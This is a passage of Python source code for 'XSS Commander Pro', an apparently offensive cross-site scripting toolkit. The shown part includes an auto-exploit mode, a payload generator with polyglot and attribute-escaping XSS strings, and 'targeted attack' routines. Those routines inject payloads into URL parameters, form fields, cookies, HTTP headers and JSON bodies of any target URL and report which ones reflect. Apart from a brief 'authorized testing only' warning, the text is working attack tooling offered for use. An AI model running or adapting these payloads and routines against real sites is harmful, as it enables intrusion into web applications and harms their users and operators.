        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_report)
        
        print(f"\n{self.colors['success']}[✓] Detailed report generated: {filename}{Style.RESET_ALL}")
        
        # Juga buat versi JSON
        json_report = {
            'scan_date': datetime.now().isoformat(),
            'target': url,
            'scanner': f"XSS Commander Pro v{self.version}",
            'vulnerabilities': vulnerabilities,
            'summary': {
                'total': total_vulns,
                'by_type': vuln_types
            }
        }
        
        json_filename = f"xss_report_{timestamp}.json"
        with open(json_filename, 'w') as f:
            json.dump(json_report, f, indent=4)
        
        print(f"{self.colors['success']}[✓] JSON report generated: {json_filename}{Style.RESET_ALL}")
    
    def auto_exploit_mode(self, url):
        """Mode otomatis: Scan -> Deteksi -> Exploit jika rentan"""
        print(f"\n{self.colors['title']}[🤖] AUTO-EXPLOIT MODE ACTIVATED{Style.RESET_ALL}")
        print(f"{self.colors['warning']}[!] Warning: This will automatically exploit any found vulnerabilities{Style.RESET_ALL}")
        print(f"{self.colors['info']}[*] Target: {url}{Style.RESET_ALL}")
        
        confirm = input(f"\n{Fore.YELLOW}[?] Continue? (y/n): {Style.RESET_ALL}").lower()
        
        if confirm != 'y':
            print(f"{self.colors['error']}[!] Auto-exploit cancelled{Style.RESET_ALL}")
            return
        
        # Step 1: Scan
        print(f"\n{self.colors['info']}[1/3] Scanning for vulnerabilities...{Style.RESET_ALL}")
        vulnerabilities = self.check_vulnerability(url)
        
        if not vulnerabilities:
            print(f"{self.colors['error']}[!] No vulnerabilities found. Exploit cancelled.{Style.RESET_ALL}")
            return
        
        # Step 2: Pilih vulnerability untuk diexploit
        print(f"\n{self.colors['info']}[2/3] Selecting best vulnerability for exploitation...{Style.RESET_ALL}")
        
        # Prioritaskan reflected XSS
        target_vuln = None
        for vuln_type, details in vulnerabilities:
            if 'reflected' in vuln_type.lower():
                target_vuln = details
                break
        
        if not target_vuln and vulnerabilities:
            target_vuln = vulnerabilities[0][1]
        
        # Step 3: Exploit
        print(f"\n{self.colors['info']}[3/3] Exploiting vulnerability...{Style.RESET_ALL}")
        self.exploit_vulnerability(target_vuln, exploit_type="alert")
        
        print(f"\n{self.colors['success']}[✓] Auto-exploit sequence completed!{Style.RESET_ALL}")
    
    def payload_generator(self, attack_type="reflected", context="html"):
        """Generate payload custom berdasarkan konteks"""
        print(f"\n{self.colors['title']}[⚙️] PAYLOAD GENERATOR{Style.RESET_ALL}")
        print(f"{self.colors['info']}[*] Type: {attack_type}, Context: {context}{Style.RESET_ALL}")
        
        generator_options = {
            'html': {
                'basic': "<script>alert('XSS')</script>",
                'img_tag': "<img src=x onerror=alert('XSS')>",
                'svg': "<svg onload=alert('XSS')>",
                'body': "<body onload=alert('XSS')>",
            },
            'attribute': {
                'single_quote': "' onmouseover='alert(1)",
                'double_quote': "\" onmouseover=\"alert(1)",
                'backtick': "` onmouseover=`alert(1)",
            },
            'javascript': {
                'eval': "';alert('XSS');//",
                'location': "javascript:alert('XSS')",
                'event': "onclick=alert('XSS')",
            },
            'polyglot': {
                'universal': "'>\"><img src=x onerror=alert(1)>",
                'multi_context': "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            }
        }
        
        if context in generator_options:
            print(f"\n{Fore.CYAN}Available payloads for {context} context:{Style.RESET_ALL}")
            for key, payload in generator_options[context].items():
                print(f"\n{Fore.YELLOW}[{key.upper()}]{Style.RESET_ALL}")
                print(f"  {payload}")
                
                # Encode variants
                print(f"  {Fore.MAGENTA}URL Encoded: {urllib.parse.quote(payload)}{Style.RESET_ALL}")
                print(f"  {Fore.MAGENTA}HTML Encoded: {html.escape(payload)}{Style.RESET_ALL}")
        
        # Custom payload builder
        print(f"\n{self.colors['title']}[🔧] CUSTOM PAYLOAD BUILDER{Style.RESET_ALL}")
        
        tag = input(f"{Fore.YELLOW}[?] HTML Tag (script, img, svg, etc): {Style.RESET_ALL}") or "script"
        event = input(f"{Fore.YELLOW}[?] Event Handler (onerror, onload, onclick, etc): {Style.RESET_ALL}") or ""
        js_code = input(f"{Fore.YELLOW}[?] JavaScript Code (alert('XSS'), etc): {Style.RESET_ALL}") or "alert('XSS_CUSTOM')"
        
        if event:
            custom_payload = f"<{tag} {event}={js_code}>"
        else:
            custom_payload = f"<{tag}>{js_code}</{tag}>"
        
        print(f"\n{self.colors['success']}[✓] Generated Custom Payload:{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{custom_payload}{Style.RESET_ALL}")
        
        # Test payload langsung
        test = input(f"\n{Fore.YELLOW}[?] Test payload immediately? (y/n): {Style.RESET_ALL}").lower()
        if test == 'y':
            test_url = input(f"{Fore.YELLOW}[?] Test URL: {Style.RESET_ALL}")
            if test_url:
                self.test_payload(test_url, custom_payload)
    
    def test_payload(self, url, payload):
        """Test payload khusus ke URL"""
        print(f"\n{self.colors['info']}[*] Testing payload: {payload}{Style.RESET_ALL}")
        print(f"{self.colors['info']}[*] Against URL: {url}{Style.RESET_ALL}")
        
        # Coba berbagai metode injection
        methods = [
            ('GET', 'param', payload),
            ('GET', 'q', payload),
            ('GET', 'search', payload),
            ('GET', 'query', payload),
            ('POST', 'input', payload),
            ('POST', 'comment', payload),
        ]
        
        for method, param, test_payload in methods:
            try:
                if method == 'GET':
                    test_url = f"{url}?{param}={urllib.parse.quote(test_payload)}"
                    response = self.session.get(test_url, timeout=self.timeout)
                else:
                    response = self.session.post(url, data={param: test_payload}, timeout=self.timeout)
                
                # Analisis response
                if test_payload in response.text:
                    print(f"{self.colors['success']}[✓] Payload reflected via {method} {param}{Style.RESET_ALL}")
                    
                    # Cek konteks
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Cek jika dalam script tag
                    if f"<script>{test_payload}" in response.text:
                        print(f"{self.colors['warning']}[!] Context: Inside script tag{Style.RESET_ALL}")
                    elif f"onerror=\"{test_payload}" in response.text:
                        print(f"{self.colors['warning']}[!] Context: Event handler attribute{Style.RESET_ALL}")
                    elif test_payload in soup.get_text():
                        print(f"{self.colors['warning']}[!] Context: Text content (may be safe){Style.RESET_ALL}")
                    else:
                        print(f"{self.colors['warning']}[!] Context: Raw HTML{Style.RESET_ALL}")
                    
                    return True
                
            except:
                continue
        
        print(f"{self.colors['error']}[-] Payload not reflected{Style.RESET_ALL}")
        return False
    
    def interactive_mode(self):
        """Mode interaktif dengan menu yang keren"""
        self.print_banner()
        
        while True:
            print(f"\n{self.colors['title']}══════════════════════ MAIN MENU ══════════════════════{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[1]{Style.RESET_ALL}  Quick Scan")
            print(f"{Fore.CYAN}[2]{Style.RESET_ALL}  Full Comprehensive Scan")
            print(f"{Fore.CYAN}[3]{Style.RESET_ALL}  Auto-Exploit Mode")
            print(f"{Fore.CYAN}[4]{Style.RESET_ALL}  Payload Generator")
            print(f"{Fore.CYAN}[5]{Style.RESET_ALL}  View Payload Database")
            print(f"{Fore.CYAN}[6]{Style.RESET_ALL}  Targeted Attack")
            print(f"{Fore.CYAN}[7]{Style.RESET_ALL}  Generate Report")
            print(f"{Fore.CYAN}[8]{Style.RESET_ALL}  Settings")
            print(f"{Fore.CYAN}[9]{Style.RESET_ALL}  Exit")
            print(f"{self.colors['title']}══════════════════════════════════════════════════════{Style.RESET_ALL}")
            
            choice = input(f"\n{Fore.YELLOW}[?] Select option (1-9): {Style.RESET_ALL}")
            
            if choice == '1':
                url = input(f"{Fore.YELLOW}[?] Target URL: {Style.RESET_ALL}")
                if url:
                    self.check_vulnerability(url)
            
            elif choice == '2':
                url = input(f"{Fore.YELLOW}[?] Target URL: {Style.RESET_ALL}")
                depth = input(f"{Fore.YELLOW}[?] Crawl depth (1-3) [2]: {Style.RESET_ALL}") or "2"
                if url:
                    self.full_scan(url, int(depth))
            
            elif choice == '3':
                url = input(f"{Fore.YELLOW}[?] Target URL: {Style.RESET_ALL}")
                if url:
                    self.auto_exploit_mode(url)
            
            elif choice == '4':
                self.payload_generator()
            
            elif choice == '5':
                self.view_payload_database()
            
            elif choice == '6':
                self.targeted_attack_mode()
            
            elif choice == '7':
                print(f"{self.colors['info']}[*] Reports are automatically generated after scans{Style.RESET_ALL}")
                print(f"{self.colors['info']}[*] Check current directory for .html and .json files{Style.RESET_ALL}")
            
            elif choice == '8':
                self.settings_menu()
            
            elif choice == '9':
                print(f"\n{self.colors['success']}[✓] Thank you for using XSS Commander Pro!{Style.RESET_ALL}")
                print(f"{self.colors['info']}[*] Remember: With great power comes great responsibility{Style.RESET_ALL}")
                sys.exit(0)
            
            else:
                print(f"{self.colors['error']}[!] Invalid option{Style.RESET_ALL}")
    
    def view_payload_database(self):
        """Tampilkan semua payload dalam database"""
        print(f"\n{self.colors['title']}══════════════════ PAYLOAD DATABASE ══════════════════{Style.RESET_ALL}")
        
        total = 0
        for category, subcats in self.payload_db.items():
            print(f"\n{Fore.RED}▶ {category.upper()}{Style.RESET_ALL}")
            
            for subcat, payloads in subcats.items():
                print(f"\n  {Fore.YELLOW}▷ {subcat.title()} ({len(payloads)} payloads){Style.RESET_ALL}")
                
                for i, payload in enumerate(payloads[:5], 1):  # Tampilkan 5 pertama saja
                    print(f"    {i}. {payload}")
                
                if len(payloads) > 5:
                    print(f"    ... and {len(payloads) - 5} more")
                
                total += len(payloads)
        
        print(f"\n{self.colors['info']}[*] Total payloads in database: {total}{Style.RESET_ALL}")
        print(f"{self.colors['title']}══════════════════════════════════════════════════════{Style.RESET_ALL}")
    
    def targeted_attack_mode(self):
        """Mode serangan terarget dengan kontrol penuh"""
        print(f"\n{self.colors['title']}══════════════════ TARGETED ATTACK MODE ══════════════════{Style.RESET_ALL}")
        
        url = input(f"{Fore.YELLOW}[?] Target URL: {Style.RESET_ALL}")
        if not url:
            return
        
        print(f"\n{self.colors['info']}[*] Analyzing target structure...{Style.RESET_ALL}")
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Analisis forms
            forms = soup.find_all('form')
            print(f"{self.colors['info']}[*] Found {len(forms)} forms{Style.RESET_ALL}")
            
            for i, form in enumerate(forms, 1):
                print(f"\n{Fore.CYAN}[Form #{i}]{Style.RESET_ALL}")
                print(f"  Action: {form.get('action', 'N/A')}")
                print(f"  Method: {form.get('method', 'GET')}")
                
                inputs = form.find_all('input')
                for inp in inputs:
                    print(f"  - Input: name='{inp.get('name', '')}', type='{inp.get('type', '')}'")
            
            # Pilih attack vector
            print(f"\n{self.colors['title']}[ATTACK VECTORS]{Style.RESET_ALL}")
            print("1. URL Parameter Injection")
            print("2. Form Parameter Injection")
            print("3. Cookie Injection")
            print("4. Header Injection")
            print("5. JSON/API Injection")
            
            vector = input(f"\n{Fore.YELLOW}[?] Select attack vector (1-5): {Style.RESET_ALL}")
            
            if vector == '1':
                self.url_parameter_attack(url)
            elif vector == '2':
                self.form_parameter_attack(url, forms)
            elif vector == '3':
                self.cookie_injection_attack(url)
            elif vector == '4':
                self.header_injection_attack(url)
            elif vector == '5':
                self.json_api_attack(url)
        
        except Exception as e:
            print(f"{self.colors['error']}[!] Error: {e}{Style.RESET_ALL}")
    
    def url_parameter_attack(self, url):
        """Serangan melalui URL parameters"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            print(f"{self.colors['warning']}[!] No URL parameters found{Style.RESET_ALL}")
            # Coba tambah parameter
            param_name = input(f"{Fore.YELLOW}[?] Enter parameter name to test: {Style.RESET_ALL}")
            if param_name:
                params = {param_name: ['test']}
            else:
                return
        
        print(f"\n{self.colors['info']}[*] Found parameters: {list(params.keys())}{Style.RESET_ALL}")
        
        for param in params.keys():
            print(f"\n{Fore.CYAN}[*] Testing parameter: {param}{Style.RESET_ALL}")
            
            # Test dengan berbagai payload
            test_payloads = [
                f"<script>alert('{param}_XSS')</script>",
                f"'><img src=x onerror=alert('{param}')>",
                f"\"><svg onload=alert('{param}')>",
                f"javascript:alert('{param}')",
            ]
            
            for payload in test_payloads:
                test_url = self.inject_payload(url, param, payload)
                print(f"{self.colors['debug']}[>] Testing: {test_url}{Style.RESET_ALL}")
                
                try:
                    response = self.session.get(test_url, timeout=self.timeout)
                    if payload.split('>')[0] in response.text:
                        print(f"{self.colors['success']}[✓] VULNERABLE: {param}{Style.RESET_ALL}")
                        
                        # Tawarkan eksploitasi
                        exploit = input(f"{Fore.YELLOW}[?] Exploit this? (y/n): {Style.RESET_ALL}").lower()
                        if exploit == 'y':
                            self.exploit_vulnerability({
                                'type': 'reflected',
                                'parameter': param,
                                'url': url
                            })
                        break
                
                except:
                    continue
    
    def form_parameter_attack(self, url, forms):
        """Serangan melalui form parameters"""
        if not forms:
            print(f"{self.colors['error']}[!] No forms found{Style.RESET_ALL}")
            return
        
        for i, form in enumerate(forms):
            print(f"\n{Fore.CYAN}[*] Attacking Form #{i+1}{Style.RESET_ALL}")
            
            form_action = form.get('action', '')
            form_method = form.get('method', 'GET').upper()
            form_url = urllib.parse.urljoin(url, form_action)
            
            # Kumpulkan input fields
            inputs = form.find_all('input')
            textareas = form.find_all('textarea')
            
            print(f"{self.colors['info']}[*] Found {len(inputs) + len(textareas)} input fields{Style.RESET_ALL}")
            
            # Buat payload untuk setiap field
            for field in inputs + textareas:
                field_name = field.get('name', '')
                field_type = field.get('type', 'text')
                
                if field_name and field_type in ['text', 'textarea', 'email', 'search']:
                    print(f"\n{self.colors['debug']}[>] Testing field: {field_name}{Style.RESET_ALL}")
                    
                    # Buat data form
                    form_data = {}
                    for f in inputs + textareas:
                        f_name = f.get('name', '')
                        if f_name:
                            if f_name == field_name:
                                form_data[f_name] = f"<script>alert('{field_name}_XSS')</script>"
                            else:
                                form_data[f_name] = f.get('value', 'test')
                    
                    # Submit form
                    try:
                        if form_method == 'POST':
                            response = self.session.post(form_url, data=form_data, timeout=self.timeout)
                        else:
                            response = self.session.get(form_url, params=form_data, timeout=self.timeout)
                        
                        if f"alert('{field_name}_XSS')" in response.text:
                            print(f"{self.colors['success']}[✓] VULNERABLE: Field '{field_name}'{Style.RESET_ALL}")
                    
                    except:
                        continue
    
    def cookie_injection_attack(self, url):
        """Serangan melalui cookie manipulation"""
        print(f"\n{self.colors['info']}[*] Cookie Injection Attack{Style.RESET_ALL}")
        
        # Coba set malicious cookie
        malicious_cookies = {
            'session_id': "<script>alert('COOKIE_XSS')</script>",
            'user': "'><img src=x onerror=alert(1)>",
            'theme': "\"><svg onload=alert(1)>"
        }
        
        for cookie_name, payload in malicious_cookies.items():
            cookies = {cookie_name: payload}
            
            print(f"{self.colors['debug']}[>] Setting cookie: {cookie_name}={payload}{Style.RESET_ALL}")
            
            try:
                response = self.session.get(url, cookies=cookies, timeout=self.timeout)
                
                # Cek jika cookie direfleksikan
                if payload in response.text:
                    print(f"{self.colors['success']}[✓] Cookie injection possible: {cookie_name}{Style.RESET_ALL}")
            
            except:
                continue
    
    def header_injection_attack(self, url):
        """Serangan melalui HTTP headers"""
        print(f"\n{self.colors['info']}[*] Header Injection Attack{Style.RESET_ALL}")
        
        malicious_headers = {
            'User-Agent': "<script>alert('UA_XSS')</script>",
            'Referer': "'><img src=x onerror=alert('REFERER_XSS')>",
            'X-Forwarded-For': "\"><svg onload=alert('XFF_XSS')>"
        }
        
        for header_name, payload in malicious_headers.items():
            headers = {header_name: payload}
            
            print(f"{self.colors['debug']}[>] Setting header: {header_name}: {payload}{Style.RESET_ALL}")
            
            try:
                response = self.session.get(url, headers=headers, timeout=self.timeout)
                
                if payload in response.text:
                    print(f"{self.colors['success']}[✓] Header injection possible: {header_name}{Style.RESET_ALL}")
            
            except:
                continue
    
    def json_api_attack(self, url):
        """Serangan melalui JSON/API endpoints"""
        print(f"\n{self.colors['info']}[*] JSON/API Attack{Style.RESET_ALL}")
        
        # Cek jika endpoint menerima JSON
        json_payloads = [
            {'username': 'admin', 'password': "<script>alert('XSS')</script>"},
            {'search': "'><img src=x onerror=alert(1)>"},
            {'comment': {'text': "\"><svg onload=alert(1)>"}},
        ]
        
        headers = {'Content-Type': 'application/json'}
        
        for payload in json_payloads:
            print(f"{self.colors['debug']}[>] Sending JSON: {json.dumps(payload)}{Style.RESET_ALL}")
            
            try:
                response = self.session.post(url, json=payload, headers=headers, timeout=self.timeout)
                
                # Cek response
                if any(str(v) in response.text for v in payload.values() if isinstance(v, str)):
                    print(f"{self.colors['success']}[✓] JSON injection possible{Style.RESET_ALL}")
            
            except:
                # Coba dengan GET parameter JSON
                try:
                    response = self.session.get(f"{url}?data={urllib.parse.quote(json.dumps(payload))}", timeout=self.timeout)
                    if any(str(v) in response.text for v in payload.values() if isinstance(v, str)):
                        print(f"{self.colors['success']}[✓] JSON injection via GET possible{Style.RESET_ALL}")
                except:
                    continue
    
    def settings_menu(self):
        """Menu pengaturan"""
        print(f"\n{self.colors['title']}══════════════════════ SETTINGS ══════════════════════{Style.RESET_ALL}")
        
        while True:
            print(f"\n{Fore.CYAN}[1]{Style.RESET_ALL} Timeout: {self.timeout}s")
            print(f"{Fore.CYAN}[2]{Style.RESET_ALL} Max Threads: {self.max_threads}")
            print(f"{Fore.CYAN}[3]{Style.RESET_ALL} User Agent: {self.session.headers.get('User-Agent', 'Default')}")
            print(f"{Fore.CYAN}[4]{Style.RESET_ALL} Load Custom Payloads")
            print(f"{Fore.CYAN}[5]{Style.RESET_ALL} Back to Main Menu")
            
            setting_choice = input(f"\n{Fore.YELLOW}[?] Select setting to change: {Style.RESET_ALL}")
            
            if setting_choice == '1':
                new_timeout = input(f"{Fore.YELLOW}[?] New timeout (seconds): {Style.RESET_ALL}")
                if new_timeout.isdigit():
                    self.timeout = int(new_timeout)
                    print(f"{self.colors['success']}[✓] Timeout updated{Style.RESET_ALL}")
            
            elif setting_choice == '2':
                new_threads = input(f"{Fore.YELLOW}[?] New max threads (1-50): {Style.RESET_ALL}")
                if new_threads.isdigit() and 1 <= int(new_threads) <= 50:
                    self.max_threads = int(new_threads)
                    print(f"{self.colors['success']}[✓] Max threads updated{Style.RESET_ALL}")
            
            elif setting_choice == '3':
                print(f"\n{self.colors['info']}[*] Current UA: {self.session.headers.get('User-Agent')}{Style.RESET_ALL}")
                print("1. Use random UA")
                print("2. Use custom UA")
                ua_choice = input(f"{Fore.YELLOW}[?] Choice: {Style.RESET_ALL}")
                
                if ua_choice == '1':
                    self.session.headers.update({'User-Agent': self.ua.random})
                    print(f"{self.colors['success']}[✓] UA set to random{Style.RESET_ALL}")
                elif ua_choice == '2':
                    custom_ua = input(f"{Fore.YELLOW}[?] Enter custom User Agent: {Style.RESET_ALL}")
                    if custom_ua:
                        self.session.headers.update({'User-Agent': custom_ua})
                        print(f"{self.colors['success']}[✓] UA updated{Style.RESET_ALL}")
            
            elif setting_choice == '4':
                payload_file = input(f"{Fore.YELLOW}[?] Path to JSON payload file: {Style.RESET_ALL}")
                if os.path.exists(payload_file):
                    try:
                        with open(payload_file, 'r') as f:
                            custom_payloads = json.load(f)
                            self.payload_db.update(custom_payloads)
                            print(f"{self.colors['success']}[✓] Custom payloads loaded{Style.RESET_ALL}")
                    except:
                        print(f"{self.colors['error']}[!] Invalid JSON file{Style.RESET_ALL}")
                else:
                    print(f"{self.colors['error']}[!] File not found{Style.RESET_ALL}")
            
            elif setting_choice == '5':
                break

def main():
    parser = argparse.ArgumentParser(
        description=f'{Fore.CYAN}XSS Commander Pro v2.0 - Ultimate XSS Toolkit{Style.RESET_ALL}',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f'''
{Fore.YELLOW}Examples:{Style.RESET_ALL}
  python3 xcp.py -u https://target.com/page?param=test
  python3 xcp.py --full https://target.com --depth 2
  python3 xcp.py --auto-exploit https://target.com/vuln.php
  python3 xcp.py --generate-payload --context html
  python3 xcp.py --interactive

{Fore.RED}⚠️ Warning: For authorized testing only!{Style.RESET_ALL}
        '''
    )
    
    parser.add_argument('-u', '--url', help='Target URL for quick scan')
    parser.add_argument('-f', '--full', help='Full comprehensive scan with crawling')
    parser.add_argument('-d', '--depth', type=int, default=2, help='Crawl depth (default: 2)')
    parser.add_argument('-a', '--auto-exploit', help='Auto scan and exploit if vulnerable')
    parser.add_argument('-p', '--generate-payload', action='store_true', help='Payload generator mode')
    parser.add_argument('-c', '--context', default='html', help='Payload context (html, attribute, javascript)')
    parser.add_argument('-i', '--interactive', action='store_true', help='Interactive mode')
    parser.add_argument('-t', '--targeted', help='Targeted attack mode')
    parser.add_argument('--list-payloads', action='store_true', help='List all payloads')
    
    args = parser.parse_args()
    
    tool = XSS_Commander_Pro()
    
    if args.interactive:
        tool.interactive_mode()
    elif args.url:
        tool.check_vulnerability(args.url)
    elif args.full:
        tool.full_scan(args.full, args.depth)
    elif args.auto_exploit:
        tool.auto_exploit_mode(args.auto_exploit)
    elif args.generate_payload:
        tool.payload_generator(context=args.context)
    elif args.targeted:
        tool.targeted_attack_mode()
    elif args.list_payloads:
        tool.view_payload_database()
    else:
        tool.print_banner()
        parser.print_help()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Program interrupted by SepkaScurty-CPU{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Critical error: {e}{Style.RESET_ALL}")
        sys.exit(1)
